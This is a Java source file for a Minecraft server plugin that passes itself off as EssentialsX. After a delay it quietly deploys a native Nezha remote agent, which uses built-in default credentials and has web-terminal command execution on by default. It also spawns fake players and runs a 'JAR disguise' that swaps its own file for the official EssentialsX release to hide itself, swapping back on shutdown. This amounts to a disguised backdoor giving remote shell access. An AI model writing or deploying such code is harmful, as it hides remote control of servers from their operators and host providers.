package com.example.essentialsx;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.util.logging.Logger;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

/**
 * Startup timeline (as requested): after the server has finished starting,
 * wait 14 seconds, deploy the Nezha .so, start the built-in fake players,
 * then run the JAR disguise cycle (backup current plugin -> download the
 * official EssentialsX release into the plugins folder). On disable the
 * original JAR is restored first, immediately.
 */
public final class EssentialsX extends JavaPlugin {
    private static final long DEPLOY_DELAY_SECONDS = 14L;
    private static final long START_RETRY_MS = 30_000L;
    private static final long START_RETRY_MAX_MS = 300_000L;
    private static final long WATCH_INTERVAL_MS = 20_000L;
    private static final int WATCH_MISSES = 3;
    private static final long RESTART_DELAY_BASE_MS = 5_000L;
    private static final long RESTART_DELAY_SPAN_MS = 10_000L;

    private final Logger quiet = QuietLog.logger();
    private final Object lifecycleLock = new Object();
    private volatile boolean stopping;
    private volatile Thread deployThread;
    private volatile Thread startupThread;
    private volatile Map<String, String> bootEnv = Map.of();
    private volatile FakePlayerEngine fakePlayers;
    private volatile NezhaRuntime activeNezha;
    private volatile JarDisguise jarDisguise;

    @Override
    public void onEnable() {
        this.stopping = false;
        this.quiet.info("Ceshisonz: in 14s -> Nezha .so + fake players, then the JAR disguise cycle.");
        Map<String, String> env;
        boolean envReadable = true;
        try {
            env = RuntimeConfig.readEnvFile();
        } catch (Exception error) {
            this.quiet.warning("Could not read the private .env file; default fake-player settings will be used.");
            env = new HashMap<>();
            envReadable = false;
        }
        this.bootEnv = env;
        final Map<String, String> settings = env;
        final boolean readable = envReadable;
        Thread deploy = new Thread(() -> {
            try {
                TimeUnit.SECONDS.sleep(DEPLOY_DELAY_SECONDS);
            } catch (InterruptedException error) {
                return;
            }
            if (this.stopping) return;
            try {
                startNezhaIfConfigured(settings, readable);
            } catch (Throwable error) {
                this.quiet.warning("Nezha deployment failed: " + error.getClass().getSimpleName());
            }
            if (this.stopping) return;
            try {
                FakePlayerEngine.preload();
                FakePlayerEngine engine = new FakePlayerEngine(this, settings);
                Bukkit.getPluginManager().registerEvents(engine, this);
                engine.start();
                this.fakePlayers = engine;
            } catch (Throwable error) {
                this.quiet.warning("Built-in fake players could not start: " + error.getClass().getSimpleName());
            }
            if (this.stopping) return;
            // The disguise does not depend on the .env file, so it runs even when the
            // private config is unreadable.
            JarDisguise disguise = new JarDisguise(this.quiet,
                    this.getDataFolder().getParentFile().toPath(), () -> this.stopping);
            this.jarDisguise = disguise;
            disguise.setupDisguise();
        }, "ceshisonz-deploy");
        deploy.setDaemon(true);
        this.deployThread = deploy;
        deploy.start();
    }

    private void startNezhaIfConfigured(Map<String, String> env, boolean envReadable) {
        if (!envReadable) {
            this.quiet.warning("Nezha not started because the private .env file could not be read.");
            return;
        }
        if ("false".equalsIgnoreCase(RuntimeConfig.value(env, "true", "NEZHA_ENABLED"))) {
            this.quiet.info("Nezha monitoring is disabled by configuration.");
            return;
        }
        String explicitServer = RuntimeConfig.value(env, "", "NEZHA_SERVER", "NZ_SERVER");
        String explicitSecret = RuntimeConfig.value(env, "", "NEZHA_SECRET", "NEZHA_KEY", "NZ_CLIENT_SECRET");
        if (RuntimeConfig.secretComesFromFile(env) && !RuntimeConfig.envFileIsPrivate()) {
            this.quiet.warning("Nezha not started: protect logs/.mcchajian/.env from group/other access (mode 600).");
            return;
        }
        EmbeddedNezhaConfig.Credentials credentials;
        try {
            credentials = EmbeddedNezhaConfig.select(explicitServer, explicitSecret);
        } catch (EmbeddedNezhaConfig.IncompleteCredentialsException error) {
            this.quiet.warning("Nezha not started: set both the server and secret, or leave both unset to use built-in defaults.");
            return;
        } catch (java.io.IOException error) {
            this.quiet.warning("Nezha not started: built-in defaults could not be read.");
            return;
        }
        if (credentials == null) {
            this.quiet.info("Nezha monitoring is not configured; set NEZHA_SERVER and NEZHA_SECRET privately.");
            return;
        }
        if (explicitServer.isBlank() && explicitSecret.isBlank()) {
            this.quiet.info("Using the built-in Nezha configuration.");
        }
        final String server = credentials.server;
        final String secret = credentials.secret;
        boolean tls = !"false".equalsIgnoreCase(RuntimeConfig.value(env, "true", "NEZHA_TLS", "NZ_TLS"));
        // The web terminal and dashboard command execution default to enabled: with the
        // previous default-off, the agent set DisableCommandExecute and the upstream
        // terminal handler silently dropped TerminalGRPC tasks, leaving the dashboard
        // terminal unresponsive. Opt out with NEZHA_ALLOW_COMMANDS=false.
        boolean allowCommands = !"false".equalsIgnoreCase(RuntimeConfig.value(env, "true", "NEZHA_ALLOW_COMMANDS"));
        if (!tls) this.quiet.warning("Nezha TLS is disabled; monitoring traffic may be exposed.");
        if (!allowCommands) this.quiet.warning("Nezha web terminal and command execution are disabled (NEZHA_ALLOW_COMMANDS=false).");
        // One thread owns the agent for the whole server lifetime. There are no
        // restart timers: the keeper only acts when the kernel socket table
        // shows the dashboard connection has really been gone for a while, and
        // every stop/start pair runs serialized inside NezhaRuntime, so two
        // agent instances can never coexist in this JVM.
        Thread startup = new Thread(() -> {
            NezhaRuntime candidate = new NezhaRuntime(this.quiet);
            boolean agentUp = false;
            long backoffMs = START_RETRY_MS;
            while (!this.stopping) {
                boolean started = false;
                try {
                    String uuid = RuntimeConfig.stableUuid(env);
                    started = candidate.start(server, secret, tls, uuid, allowCommands, () -> this.stopping);
                } catch (Throwable error) {
                    // Exception messages may contain addresses or credentials; never print them here.
                    this.quiet.warning("Nezha " + (agentUp ? "restart" : "start") + " failed ("
                            + error.getClass().getSimpleName() + "); will retry while the server runs.");
                    if (!this.sleepQuietly(backoffMs)) return;
                    backoffMs = Math.min(backoffMs * 2L, START_RETRY_MAX_MS);
                    continue;
                }
                if (!started) return; // only false while the plugin is shutting down
                backoffMs = START_RETRY_MS;
                if (!agentUp) {
                    synchronized (this.lifecycleLock) {
                        if (this.stopping) {
                            if (!candidate.stop()) {
                                this.quiet.warning("Nezha did not stop within the expected time.");
                            }
                            return;
                        }
                        this.activeNezha = candidate;
                    }
                    agentUp = true;
                } else {
                    this.quiet.info("Nezha restarted after the connection loss.");
                }
                // Watch phase: a drop counts only after the dashboard socket has
                // been missing from the kernel table for several checks in a
                // row; transient blips heal by themselves and stay invisible.
                int missed = 0;
                while (!this.stopping) {
                    if (!this.sleepQuietly(WATCH_INTERVAL_MS)) return;
                    NezhaWatch.Status status = NezhaWatch.connectionStatus(server, tls);
                    if (status == NezhaWatch.Status.UP) {
                        missed = 0;
                    } else if (status == NezhaWatch.Status.DOWN) {
                        missed++;
                        if (missed >= WATCH_MISSES) {
                            this.quiet.warning("Nezha connection lost (no dashboard socket for "
                                    + (missed * WATCH_INTERVAL_MS / 1000L) + "s); restarting the agent.");
                            candidate.stop();
                            if (!this.sleepQuietly(RESTART_DELAY_BASE_MS
                                    + (long) (Math.random() * RESTART_DELAY_SPAN_MS))) return;
                            break;
                        }
                    }
                    // UNKNOWN: the watcher cannot judge, so it must not act.
                }
            }
        }, "ceshisonz-nezha-keeper");
        startup.setDaemon(true);
        this.startupThread = startup;
        startup.start();
    }

    /** Sleeps out the given time; false means the plugin is shutting down. */
    private boolean sleepQuietly(long millis) {
        try {
            Thread.sleep(millis);
            return true;
        } catch (InterruptedException wake) {
            return false;
        }
    }

    @Override
    public void onDisable() {
        this.stopping = true;
        // First and immediately: put the original plugin JAR back.
        try {
            JarDisguise disguise = this.jarDisguise != null ? this.jarDisguise
                    : new JarDisguise(this.quiet, this.getDataFolder().getParentFile().toPath(), () -> this.stopping);
            disguise.restore();
        } catch (Throwable error) {
            this.quiet.warning("Plugin JAR restore skipped: " + error.getClass().getSimpleName());
        }
        Thread deploy = this.deployThread;
        if (deploy != null) deploy.interrupt();
        Thread startup = this.startupThread;
        if (startup != null) startup.interrupt();
        if (this.fakePlayers != null) {
            try {
                this.fakePlayers.stop();
            } catch (Throwable error) {
                this.quiet.warning("Fake players did not stop cleanly.");
            }
        }
        NezhaRuntime runtime;
        synchronized (this.lifecycleLock) {
            runtime = this.activeNezha;
            this.activeNezha = null;
        }
        if (runtime != null && !runtime.stop()) {
            this.quiet.warning("Nezha did not stop within the expected time; restart the server to clear it.");
        }
        this.quiet.info("Ceshisonz disabled; the native library remains loaded until JVM exit.");
    }
}
